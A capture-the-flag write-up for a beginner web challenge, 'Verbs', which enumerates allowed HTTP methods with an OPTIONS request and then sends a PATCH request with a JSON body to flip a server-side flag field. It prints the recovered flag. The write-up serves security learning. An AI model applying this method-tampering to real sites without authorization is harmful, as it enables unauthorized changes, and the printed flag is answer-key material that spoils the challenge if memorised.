# Verbs

> We need to patch up this site. Can you correct the page to get us the secret info? Here

This was a challenge to play around with the different HTTP methods.

First, determining the possible options that the server will accept:

```
$ curl -i -X OPTIONS https://challenges.silicon-ctf.party/ctf101/verbs/index.html
HTTP/2 200 
date: Sun, 06 Jun 2021 00:45:37 GMT
content-type: text/html; charset=utf-8
content-length: 0
allow: POST, GET, OPTIONS, PUT, PATCH, HEAD
strict-transport-security: max-age=15724800; includeSubDomains
```

Also, looking at the page we see a JSON payload of:
```
{
    "give_me_secret_plans": "no"
}
```

So, lets just try and make that yes with each of the options. I also assume we need to set the Content-Type with the requests, so I just tried each of the above options and eventually got a successful request using burpsuite (I tried curl, but received a 500 error, so just switched to burp and it worked fine). 

```
PATCH /ctf101/verbs/index.html HTTP/1.1
Host: challenges.silicon-ctf.party
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://silicon-ctf.party/challenges
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 30

{"give_me_secret_plans":"yes"}
```

Gave the flag:

```
silicon{DiAgRaM0fD3athStarWeaponMechanizm}
```